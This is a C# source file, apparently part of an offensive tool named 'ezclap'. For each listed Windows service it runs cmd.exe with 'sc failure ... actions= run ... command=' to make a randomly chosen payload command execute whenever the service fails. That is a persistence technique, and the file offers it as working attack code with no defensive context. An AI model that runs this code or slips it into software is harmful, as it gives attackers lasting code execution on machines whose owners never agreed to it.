using System;
using System.Collections.Generic;
namespace ezclap
{
	public class AddFailureCommand
    {
		public AddFailureCommand(List<string> services, string[] payload)
        {
            Initialize(services, payload);
        }
		private static void Initialize(List<string> services, string[] payload)
        {
            Random rnd = new Random();
            foreach (string service in services)
            {
                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000//// command= \"" + payload[rnd.Next(0,payload.Length-1)] + "\" ";
                System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
            }

        }
    }
}
